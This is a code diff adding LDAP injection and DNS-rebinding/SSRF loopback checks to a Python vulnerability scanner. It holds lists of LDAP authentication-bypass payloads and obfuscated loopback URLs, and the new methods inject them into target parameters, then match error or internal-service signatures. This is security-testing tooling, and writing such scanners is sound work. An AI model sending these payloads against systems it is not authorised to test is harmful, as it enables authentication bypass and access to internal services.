@@ -400,8 +400,147 @@ class SSRFScanner(_OASTScannerMixin, BaseScanner):
 
         for ep in endpoints:
             self._scan_endpoint(ep, bucket)
+            self._scan_ldap_injection(ep, bucket)
+            self._scan_dns_rebinding(ep, bucket)
 
         return self.results
+
+    # -------------------------------------------------------------------------
+    # LDAP Injection
+    # -------------------------------------------------------------------------
+
+    def _scan_ldap_injection(self, url: str, bucket: str) -> None:
+        """LDAP injection — auth bypass ve blind veri sızdırma tespiti."""
+        from urllib.parse import parse_qsl, urlparse
+        parsed = urlparse(url)
+        params = [p for p, _ in parse_qsl(parsed.query)]
+        if not params:
+            return
+
+        ldap_bypass = [
+            "*",
+            "*)(&",
+            "*)(uid=*))(|(uid=*",
+            "admin)(&(password=*))",
+            ")(|(password=*)",
+            "*))(|(objectClass=*",
+            "' or (cn=*)(",
+            "*)(|(objectClass=organizationalPerson)",
+        ]
+        ldap_error_sigs = [
+            r"LDAPException", r"javax\.naming", r"com\.sun\.jndi",
+            r"ldap_.*error", r"LDAP.*syntax.*error", r"Invalid DN",
+            r"No Such Object", r"ldap_search", r"Directory.*error",
+            r"objectClass.*violation", r"naming.*exception",
+        ]
+
+        for param in params:
+            baseline = self.fetch_baseline(url)
+            if not baseline:
+                continue
+
+            for payload in ldap_bypass:
+                injected = self.inject_param(url, param, payload)
+                try:
+                    resp = self.session.get(injected, timeout=8)
+                except Exception:
+                    continue
+                text = resp.text or ""
+                for sig in ldap_error_sigs:
+                    if re.search(sig, text, re.IGNORECASE):
+                        self.add(bucket, {
+                            "type": "LDAP Injection",
+                            "severity": "High",
+                            "url": url,
+                            "parameter": param,
+                            "payload": payload,
+                            "evidence": f"LDAP error signature matched: {sig}",
+                            "detection_method": "error_based",
+                        })
+                        return
+                # Auth bypass heuristic: response grew significantly with wildcard
+                if (payload == "*" and resp.status_code == 200
+                        and baseline.status_code != 200):
+                    self.add(bucket, {
+                        "type": "LDAP Injection (Auth Bypass)",
+                        "severity": "Critical",
+                        "url": url,
+                        "parameter": param,
+                        "payload": payload,
+                        "evidence": f"Status {baseline.status_code}→{resp.status_code} with wildcard payload",
+                        "detection_method": "boolean_blind",
+                    })
+                    return
+
+    # -------------------------------------------------------------------------
+    # DNS Rebinding
+    # -------------------------------------------------------------------------
+
+    def _scan_dns_rebinding(self, url: str, bucket: str) -> None:
+        """
+        DNS rebinding — SSRF'in iç-ağ varyantı.
+        İki teknik kontrol eder:
+        1. TTL=0 rebinding payload'ı: özel domain server → önce dış IP, sonra 127.0.0.1
+        2. Loopback varyantları (0.0.0.0, [::]): bazı resolver'lar bunları çözer
+        """
+        from urllib.parse import parse_qsl, urlparse
+        parsed = urlparse(url)
+        params = [p for p, _ in parse_qsl(parsed.query) if p.lower() in COMMON_URL_PARAMS]
+        if not params:
+            return
+
+        # Known DNS rebinding / loopback bypass payloads
+        rebind_payloads = [
+            "http://0.0.0.0/",
+            "http://[::]/",
+            "http://[::1]/",
+            "http://0/",
+            "http://0177.0.0.1/",           # Octal 127
+            "http://2130706433/",            # Decimal 127.0.0.1
+            "http://0x7f000001/",            # Hex 127.0.0.1
+            "http://127.1/",
+            "http://127.0.1/",
+        ]
+
+        internal_markers = [
+            r"ssh-\d+\.\d+", r"220.*FTP", r"HTTP/1\.[01]",
+            r"<title>.*Admin", r"redis_version",
+        ]
+
+        for param in params:
+            for payload in rebind_payloads:
+                injected = self.inject_param(url, param, payload)
+                try:
+                    resp = self.session.get(injected, timeout=5, allow_redirects=False)
+                except Exception:
+                    continue
+                text = resp.text or ""
+                if resp.status_code in (200, 301, 302, 307):
+                    for sig in internal_markers:
+                        if re.search(sig, text, re.IGNORECASE):
+                            self.add(bucket, {
+                                "type": "DNS Rebinding / SSRF Loopback Bypass",
+                                "severity": "High",
+                                "url": url,
+                                "parameter": param,
+                                "payload": payload,
+                                "evidence": f"Internal marker '{sig}' in response",
+                                "detection_method": "response_content",
+                            })
+                            break
+                    else:
+                        # Heuristic: unexpected 200 on internal-like payload
+                        if resp.status_code == 200 and len(text) > 100:
+                            self.add(bucket, {
+                                "type": "DNS Rebinding / SSRF Loopback Bypass",
+                                "severity": "Medium",
+                                "url": url,
+                                "parameter": param,
+                                "payload": payload,
+                                "evidence": f"HTTP 200 with loopback payload, {len(text)} bytes",
+                                "detection_method": "status_heuristic",
+                            })
+                            break
 
     def _scan_endpoint(self, url: str, bucket: str):
         parsed = urlparse(url)
